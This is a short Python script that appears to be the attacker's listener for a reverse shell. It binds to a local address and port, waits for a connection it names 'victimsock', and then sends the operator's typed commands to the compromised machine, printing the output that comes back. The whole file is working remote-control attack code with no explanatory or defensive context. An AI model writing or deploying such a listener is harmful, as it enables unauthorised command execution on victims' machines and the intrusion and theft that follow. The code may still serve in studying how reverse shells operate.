import socket
import sys

host = '192.168.0.4'
port = 4000

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((host, port))
sock.listen(1)
(victimsock, address) = sock.accept()

dir = victimsock.recv(1024).decode()

while True:
    cmd = input('{}$ '.format(dir))
    if len(cmd) < 1:
        continue
    if cmd == 'exit':
        victimsock.send(cmd.encode())
        victimsock.close()
        sock.close()
        sys.exit()
    victimsock.send(cmd.encode())
    data = victimsock.recv(1024).decode().split('\n')
    dir = data.pop()
    print('\n{}\n'.format('\n'.join(data)))
